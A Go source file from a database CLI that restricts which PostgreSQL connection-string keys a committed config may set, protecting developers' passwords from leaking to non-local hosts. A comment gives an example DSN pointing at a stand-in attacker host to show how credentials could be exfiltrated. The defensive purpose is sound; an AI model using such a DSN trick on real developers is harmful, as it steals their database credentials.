package postgres

import (
	"errors"
	"fmt"
	"net/netip"
	"os"
	"regexp"
	"strconv"
	"strings"

	"github.com/jackc/pgx/v5"
	"github.com/jackc/pgx/v5/pgconn"
)

// The dev-database DSN policy (security audit F4, owner decision
// 2026-10-21 "loopback only"; docs/design/07-cli-config.md §DSN policy).
//
// database.dsn is read from the COMMITTED sqletch.yaml, so it says
// whatever the repository's author wants — while pgx fills every key it
// omits from the RUNNING developer's environment (PGPASSWORD,
// PGPASSFILE / ~/.pgpass, PGSERVICE / ~/.pg_service.conf, client TLS
// files) and by default answers a server's cleartext-password request.
// Unrestricted, `dsn: postgres://attacker.example/x` would send the
// developer's password to a host the repository chose. DevConnConfig
// is the one place a user-supplied PostgreSQL DSN becomes a connection
// config, and it:
//
//  1. accepts only the keys in devDSNAllowedKeys — none of which makes
//     pgx read a file or redirect the connection — and refuses every
//     other key before pgx touches the filesystem or the network;
//  2. refuses a multi-host DSN (pgx would try every host with the same
//     password);
//  3. on a loopback host (localhost, 127.0.0.0/8, ::1, a unix socket
//     directory) keeps libpq's ordinary ambient-password behavior;
//  4. on any other host uses ONLY a password the DSN itself states
//     (non-empty) and demands SCRAM-SHA-256, so neither cleartext nor
//     MD5 is ever answered.

// devDSNAllowedKeys is the conservative allow-list of keys a
// database.dsn may spell (libpq names; pgconn also accepts `database`
// for `dbname`, and the URI-only `ssl=true` alias rides on sslmode).
// Every addition must be shown not to read a file, redirect the
// connection, or relax authentication — which is why passfile,
// service, servicefile, sslkey, sslcert, sslrootcert, sslpassword,
// hostaddr, require_auth, target_session_attrs and arbitrary runtime
// parameters are all absent.
var devDSNAllowedKeys = []string{
	"host", "port", "dbname", "user", "password",
	"sslmode", "connect_timeout", "application_name",
}

// remoteRequireAuth is the require_auth applied to a non-loopback host:
// SCRAM never discloses the password to the server, so a hostile server
// learns nothing it could replay.
const remoteRequireAuth = "scram-sha-256"

// DSNPolicyError is a refusal of database.dsn under the dev-database
// DSN policy. The CLI maps it to SQLETCH321 against sqletch.yaml.
type DSNPolicyError struct {
	// Key is the refused connection-string key, when the refusal is
	// about a key.
	Key string
	// MultiHost is set when the DSN names more than one host/port.
	MultiHost bool
}

func (e *DSNPolicyError) Error() string {
	if e.MultiHost {
		return "database.dsn names more than one host: sqletch connects to exactly one development database, and pgx would offer the same credentials to every host in the list"
	}
	return fmt.Sprintf("database.dsn sets %q, which sqletch does not accept: the DSN comes from the committed sqletch.yaml, and keys beyond %s can make the driver read local files (password, service and TLS key files), redirect the connection, or relax authentication on the repository's say-so",
		e.Key, strings.Join(devDSNAllowedKeys, ", "))
}

// Hint spells the compliant rewrite.
func (e *DSNPolicyError) Hint() string {
	if e.MultiHost {
		return "name a single host in database.dsn (e.g. `postgres://user@localhost:5432/dev`), or leave it empty to use a disposable container"
	}
	return "keep database.dsn to " + strings.Join(devDSNAllowedKeys, ", ") +
		"; settings like a service or password file belong in your own shell environment (PGSERVICE, PGPASSFILE), which applies to a loopback host"
}

// notAllowedKey matches pgconn's ConnStringAllowedKeys refusal; the key
// is %q-quoted. Pinned by TestDevConnConfig_ForbiddenKeysRejected so a
// pgx upgrade that rewords it is noticed (and still fails closed: the
// error then surfaces as an ordinary connect failure).
var notAllowedKey = regexp.MustCompile(`connection string key ("(?:[^"\\]|\\.)*") is not in ConnStringAllowedKeys`)

// refusedKey extracts the key named by a ConnStringAllowedKeys refusal.
func refusedKey(err error) (string, bool) {
	var pce *pgconn.ParseConfigError
	if !errors.As(err, &pce) {
		return "", false
	}
	m := notAllowedKey.FindAllStringSubmatch(pce.Error(), -1)
	if len(m) == 0 {
		return "", false
	}
	k, uerr := strconv.Unquote(m[len(m)-1][1])
	if uerr != nil {
		return "", false
	}
	return k, true
}

// DevConnConfig parses a user-supplied dev-database DSN under the policy
// above. ambientDropped reports that an environment/passfile/service
// password was discarded because the host is not loopback (callers use
// it to explain an authentication failure). A refusal is a
// *DSNPolicyError; any other error is the DSN failing to parse.
func DevConnConfig(dsn string) (cfg *pgx.ConnConfig, ambientDropped bool, err error) {
	cfg, err = pgx.ParseConfigWithOptions(dsn, pgx.ParseConfigOptions{
		ParseConfigOptions: pgconn.ParseConfigOptions{ConnStringAllowedKeys: devDSNAllowedKeys},
	})
	if err != nil {
		if k, ok := refusedKey(err); ok {
			return nil, false, &DSNPolicyError{Key: k}
		}
		return nil, false, err
	}

	// Fallbacks also carry the plaintext retry of the SAME host that
	// sslmode=prefer/allow adds; only a different host/port is a second
	// destination.
	for _, fb := range cfg.Fallbacks {
		if fb.Host != cfg.Host || fb.Port != cfg.Port {
			return nil, false, &DSNPolicyError{MultiHost: true}
		}
	}

	if isLoopbackHost(cfg.Host, cfg.Port) {
		return cfg, false, nil
	}

	stated := statedPassword(dsn, cfg)
	ambientDropped = cfg.Password != "" && cfg.Password != stated
	cfg.Password = stated
	cfg.RequireAuth = remoteRequireAuth
	return cfg, ambientDropped, nil
}

// isLoopbackHost reports whether host is this machine: a unix-socket
// directory, `localhost`, or a loopback IP literal. Anything it cannot
// classify (other names, `localhost.`, shorthand IPv4) is remote — the
// fail-closed direction.
func isLoopbackHost(host string, port uint16) bool {
	if network, _ := pgconn.NetworkAddress(host, port); network == "unix" {
		return true
	}
	if strings.EqualFold(host, "localhost") {
		return true
	}
	ip, err := netip.ParseAddr(host)
	return err == nil && ip.Unmap().IsLoopback()
}

// statedPassword returns the password database.dsn itself states, or ""
// when it states none. It cannot simply be cfg.Password: pgx fills an
// unstated password from PGPASSWORD or a service file, and — whenever
// the password is EMPTY, even an explicitly stated empty one — from the
// passfile. So:
//
//   - "is a password key present at all" is decided by pgconn itself:
//     re-parsing with `password` removed from the allow-list fails
//     exactly when the DSN spells one (userinfo or key);
//   - its VALUE is read from a third parse with the passfile pinned to
//     the null device, so pgx has nowhere to fill an empty one from.
//
// Every uncertain outcome answers "" (no password: authentication
// fails, nothing leaks).
func statedPassword(dsn string, cfg *pgx.ConnConfig) string {
	noPassword := make([]string, 0, len(devDSNAllowedKeys))
	for _, k := range devDSNAllowedKeys {
		if k != "password" {
			noPassword = append(noPassword, k)
		}
	}
	_, err := pgconn.ParseConfigWithOptions(dsn, pgconn.ParseConfigOptions{ConnStringAllowedKeys: noPassword})
	if k, ok := refusedKey(err); !ok || k != "password" {
		return ""
	}

	pinned, ok := withPassfile(dsn, os.DevNull)
	if !ok {
		return ""
	}
	pc, err := pgconn.ParseConfigWithOptions(pinned, pgconn.ParseConfigOptions{
		ConnStringAllowedKeys: append(append([]string{}, devDSNAllowedKeys...), "passfile"),
	})
	if err != nil || pc.Host != cfg.Host || pc.Port != cfg.Port || pc.Database != cfg.Database || pc.User != cfg.User {
		// The composed string must describe the same connection; if it
		// does not, the composition misread the DSN.
		return ""
	}
	return pc.Password
}

// withPassfile adds `passfile=path` to dsn in its own syntax. The DSN
// was already accepted under devDSNAllowedKeys, so it carries no
// passfile key of its own to conflict with.
func withPassfile(dsn, path string) (string, bool) {
	if strings.HasPrefix(dsn, "postgres://") || strings.HasPrefix(dsn, "postgresql://") {
		// pgconn treats the text up to the first '@' (searching only
		// until the first '/') as userinfo; the query, if any, starts at
		// the first '?' after it.
		_, rest, _ := strings.Cut(dsn, "://")
		if i := strings.IndexAny(rest, "@/"); i >= 0 && rest[i] == '@' {
			rest = rest[i+1:]
		}
		// (A '?' inside IPv6 brackets — which pgconn does not validate —
		// would misplace the parameter; statedPassword's same-connection
		// check then rejects the composition.)
		sep := "?"
		if strings.Contains(rest, "?") {
			sep = "&"
		}
		return dsn + sep + "passfile=" + uriEscape(path), true
	}
	return "passfile='" + strings.NewReplacer(`\`, `\\`, `'`, `\'`).Replace(path) + "' " + dsn, true
}

// uriEscape percent-encodes everything but unreserved characters and '/'.
func uriEscape(s string) string {
	var b strings.Builder
	for i := 0; i < len(s); i++ {
		c := s[i]
		if c >= 'a' && c <= 'z' || c >= 'A' && c <= 'Z' || c >= '0' && c <= '9' || strings.IndexByte("-._~/", c) >= 0 {
			b.WriteByte(c)
			continue
		}
		fmt.Fprintf(&b, "%%%02X", c)
	}
	return b.String()
}
